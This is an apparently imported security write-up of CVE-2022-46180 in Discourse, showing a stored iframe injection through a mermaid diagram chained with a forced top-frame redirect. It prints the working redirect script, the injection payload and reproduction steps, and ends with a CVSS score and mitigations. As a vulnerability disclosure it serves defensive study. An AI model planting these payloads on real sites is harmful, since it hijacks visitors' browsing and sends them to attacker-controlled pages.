---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-18_stored-iframe-injection-permanent-open-redirection-zero-day.md
original_filename: 2023-05-18_stored-iframe-injection-permanent-open-redirection-zero-day.md
title: Stored Iframe Injection & Permanent Open Redirection - Zero Day
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- clickjacking
- api-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- clickjacking
- api-security
language: en
raw_sha256: 3d540dde35c3689a57bb5587cd4770f7177cbd4e6d219dbdc431ff88c9cc23c5
text_sha256: 4d745cb1e6c06e8042a64ad117c3c10b1c2c1c6ec1b7c31de2357c9a00f34ae4
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# Stored Iframe Injection & Permanent Open Redirection - Zero Day

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-18_stored-iframe-injection-permanent-open-redirection-zero-day.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, clickjacking, api-security
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `3d540dde35c3689a57bb5587cd4770f7177cbd4e6d219dbdc431ff88c9cc23c5`
- Text SHA256: `4d745cb1e6c06e8042a64ad117c3c10b1c2c1c6ec1b7c31de2357c9a00f34ae4`


## Content

---
title: "Stored Iframe Injection & Permanent Open Redirection - Zero Day"
url: "https://shahjerry33.medium.com/stored-iframe-injection-permanent-open-redirection-zero-day-ce7cd15903ac"
authors: ["Jerry Shah (@Jerry)"]
programs: ["Discourse"]
bugs: ["HTML injection", "Open redirect"]
publication_date: "2023-05-18"
added_date: "2023-05-22"
source: "pentester.land/writeups.json"
original_index: 1139
scraped_via: "browseros"
---

# Stored Iframe Injection & Permanent Open Redirection - Zero Day

Stored Iframe Injection & Permanent Open Redirection - Zero Day
Jerry Shah (Jerry)
Follow
5 min read
·
May 18, 2023

177

Press enter or click to view image in full size

Summary

An iFrame is a way to embed a webpage within another webpage. It’s like a small window that shows content from a different website.

Open redirection vulnerability allows attackers to redirect users from a legitimate website to an attacker’s controlled website.

Description

We have found a very unique vulnerability in Discourse platform using which an attacker can redirect any user from Discourse to any website that attacker wants. We got the CVE for identifying this vulnerability which is CVE-2022-46180. The vulnerability was in discourse-mermaid-theme-component that was allowing to load the iframe in the topic creation and comment section of any created topic and the iframe was stored in the comment section. Initially when we injected the iframe the impact was low because it was only affecting the Integrity from the CIA triangle but then we chained it with the open redirection attack the severity went to medium because now Integrity and Availability both are affected from CIA triangle.

To achieve redirection we created a small script that redirects the user from the original website to another website upon visiting. It mainly happened because of the function window.top.location.replace() we used in the script.

Anatomy of Iframe with Permanent Open Redirection

The Script Used (Hosted on our server):

<html>
<body>
<script language=’javascript’ type=’text/javascript’>
try {
var rurl = ‘https://00eth0.xss.ht?&';
window.top.location.replace(rurl);
} catch(exception) {
document.write(“This page has moved, <A HREF=’http://ww6.gsrtc.com?&amp;&amp;jserror=1'>Click here</A> to go there.”);
}
</script>
</body>
</html>

Breaking the Code:

The <html> and <body> tags define the HTML structure and content of the page.
The <script> tag defines a block of JavaScript code that is executed by the web browser. The language attribute specifies that the code is written in the JavaScript language, and the type attribute specifies that the code is of type text/javascript.
The try block contains a JavaScript function that attempts to execute the following code:

a. The variable rurl is set to the value ‘https://00eth0.xss.ht?&’.

b. The window.top.location.replace(rurl) code replaces the current web page’s location with the URL stored in the rurl variable, effectively redirecting the user to the website at https://00eth0.xss.ht.

4. If an exception is caught in the try block (i.e., if the code in the try block fails to execute), the catch block is executed instead. In this case, the document.write() function is used to display a message on the web page that says “This page has moved, Click here to go there.” The A HREF attribute of the hyperlink points to the URL http://ww6.gsrtc.com?&amp;&amp;jserror=1, which is the destination website that the user is redirected to if the code in the try block fails.

Overall, this code was attempting to redirect the user to the website at https://00eth0.xss.ht. If this redirection fails, the user is redirected to another website at http://ww6.gsrtc.com?&amp;&amp;jserror=1.

How we found this vulnerability ?

We created a post from account A and visited it from account B to make a comment
Press enter or click to view image in full size
Comment Section

2. We used a markdown payload with mermaid feature:

Get Jerry Shah (Jerry)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

'''mermaid height=180,auto
classDiagram
Class08 ←> C2: Cool label<iframe/src=’https://ispsolutions.inn/'>
'''

Press enter or click to view image in full size
Injecting Payload - Mermaid
Press enter or click to view image in full size
Loading the frame content on Discourse

NOTE-1: ispsolutions.inn was our domain on which the redirection script of hosted.

NOTE-2: It is not mandatory to have a mermaid feature enable, you can directly inject the iframe. In my case it was because of mermaid.

3. Then after 2 seconds of loading the iframe, the discourse website got redirected to https://00eth0.xss.ht domain

Press enter or click to view image in full size
Permanent Redirection

Why this happened ?

This happened because of the window.top.location.replace() function being used in the script. This function is used in websites to perform a page redirection by replacing the current URL in the browser’s address bar with a new URL.

The primary purpose of window.top.location.replace() is to redirect the user to a different web page. By specifying a new URL as the function’s argument, the browser immediately navigates to that URL, effectively replacing the current page. This is a way to direct users to a different location on the web.

So when I loaded the website in an iframe the window.top.location.replace() function got triggered and it redirected the page from an iframe to the original website.

Press enter or click to view image in full size
Attack Flow

Impact

If any user injects this payload into any post’s reply or even creating the post, no other user will be able to read that post as he/she will be redirected to the attacker’s controlled website. Apart from it an attacker can use this vulnerability to redirect users to other malicious websites.

Calculated CVSS

Vector String - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L

Score - 5.4 Medium

Mitigation

It is recommended to implement the below mentioned fixes

User input should be filtered whenever it is received.
When the data is send back from the server is should be encoded.
Implement CSP with proper response headers like X-Frame-Options.
Restrict harmful tags from being load.

Special thanks to Jinay Patel for helping me in exploiting this vulnerability.

Press enter or click to view image in full size
